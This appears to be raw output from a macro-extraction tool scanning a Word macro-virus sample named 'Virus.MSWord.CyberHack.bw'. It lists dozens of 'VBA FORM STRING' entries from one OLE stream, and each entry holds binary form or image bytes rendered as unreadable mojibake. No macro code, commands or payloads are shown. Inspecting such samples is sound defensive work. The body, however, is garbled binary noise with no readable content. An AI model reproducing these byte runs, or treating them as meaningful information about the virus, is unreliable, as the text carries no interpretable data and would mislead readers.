��Z��k��k��k��k��k��k��k��k��k��k��kƜkƜkƜkƜkƜkƜkƜkƜkΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥs��Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s�����������������������������������������������������������ƭ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1�ε����ֽ�������ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ��{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z{cB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������ν�������������������������Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�ν�ν�ν�ν�ν��Ɯ�Ɯ�Ɯ�Ɯ�Μ�Μ�Μ�Μν�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!{R)sJ!{R){R)�kB��k��c��Z��cޜRZ9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R)ޜJ�����������k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��9��k{J!sJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!sJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!��B��R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!��k��k��k��k��k��k��k��k��kƜkƜkƜkƜkƜkƜkƜkƜkΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥs��c!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s�����������������������������������������������������������ƭ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1�ε�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ��{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
91!����Ό��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�{J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�ν�ν�ν�ν�ν��Ɯ�Ɯ�Ɯ�Ɯ�Μ�Μ�Υ�Υ�֭�֭�֭�֭�Ɯ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!��R���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R)֔J�����������R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c)��c��k��s��cJ1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!�s1��k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
scB��k��k��k��k��k��kƜkƜkƜkƜkƜkƜkΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥs��k1)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s�����������������������������������������������������������ƭ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1�ε�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ��{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cZB���Υs��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��R��Z��Z��Z��Z��Z��Z��Z��R��Z��Z��R��R��Z��Z��Z��Z��Z��R��Z��Z��Z��Z��Z��Z��Z��R��Z��Z��Z�{R1)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
scJ������������Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�Ƶ�ν�ν�ν�ν�ν�ν��Ɯ�Ɯ�Ɯ�Ɯ�Μ�Μ�Υ�֭�֭�֭�֭�֭�֭�֭�Μ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!��R��������������s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!{R)sJ!sJ!sJ!sJ!sJ!{R){J!{R){R){R){R){R){R){R){R)֌B�����������R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��B��c��c��s��B9!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!�R!��ccB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
scB��k��k��k��kƜkƜkƜkƜkƜkΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsΥsJB1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s�����������������������������������������������������������ƭ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1�ε�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ��{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
11!�Ό��k��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��ZJ9!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s����������ƜƵ�Ƶ�Ƶ�Ƶ�ν�ν�ν�ν�ν�ν�ν��Ɯ�Ɯ�Ɯ�Ɯ�Μ�Υ�Υ�֭�֭�֭�֭���޵�޵�޵�֭
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!��R��������������s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!֌B����������J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R!��R��Z��Z��c�J)!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!{J!{J!sJ!sJ!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!�J{J!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!��Z��k��k��k��k��k��k��k��k��k��k��k��k��k��kƜkƜkƜkƜkƜkƜkƜkƜkƜkƜkƜkƜkƜkƜkƜkƜkƜkƜkƜkƜkƜkƜkƜkƜkƜkƜk��cJ9!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s�����������������������������������������������������������ƭ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
999�ε����ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ��{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k޵{��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�{R1)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
scJ����������Υν�ν�ν�ν�ν�ν�ν�ν�ν��Ɯ�Ɯ�Ɯ�Ɯ�Υ�Υ�֭�֭�֭�֭�޵����������������֭
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!��R��������������k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!{R)sJ!{R){R){R){J!{R){R){J!{R)ޜJ����������J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R!��R��R��R��Z΄9!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!{J!{J!{J!sJ!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!sJ!!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{J��Z��Z��Z��Z��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c��c�kB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��s�����������������������������������������������������������ƭ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
999�ε����������ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ��{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
scB�Ƅ��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�sJ
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
RJB����������֭ν�ν�ν�ν�ν��Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Μ�Υ�Υ�֭�֭�֭�֭�޵���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!sJ!��R��������������Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R)ޜJ����������J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!�R!��B��R��R��s��B
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!sJ!sJ!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!sJ!9!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sZ9�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{JZB1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{�����������������������������������������������������������έ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
999�ε�������������������������������ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ�ֽ��{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B1!�{��c��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��ZcR1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
11!����������޵ν�ν��Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Μ�Υ�Υ�֭�֭�֭�֭�޵������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R)��c��������������Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R){R)�Z1ޥc����������J
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!�R!��c��������c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!Z9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J9!�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�{J�kB�kB�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�{J�Z1)!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{�����������������������������������������������������������έ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
999�ε�������������������������������������������������������ֽ�ֽ����ֽ�ֽ��{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{R��c��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z�{RB1!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JB1����������Ɯ�Ɯ�Ɯ�Ɯ�Ɯ�Μ�Υ�Υ�֭�֭�֭�֭�޵�޵���������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sZ9sZ9sZ9sZ9sZ9sZ9sZ9sZ9sZ9sZ9sZ9�Z1�Z1sZ9�Z1�Z1�Z1�Z1�Z1�Z1��s��������������Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�Z1�k����������9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sJ!sJ!sJ!sJ!��s��������k
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!{J!cB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cR1�kB�s9�s9�s9�kB�s9�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kB�kBcB
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{�����������������������������������������������������������ε��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
11!������������������������������������������������������������������������ZZR
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cZ9�{R��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��Z��ZscB!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cZB����������Ɯ�Ɯ�Ɯ�Υ�Υ�Υ�֭�֭�֭�֭�޵������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sZ9sZ9sZ9sZ9sZ9sZ9sZ9sZ9sZ9sZ9sZ9sZ9sZ9sZ9sZ9sZ9sZ9sZ9sZ9sZ9�ބ��������������Z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.CyberHack.bw' - OLE stream: 'Macros/Calivent/o'
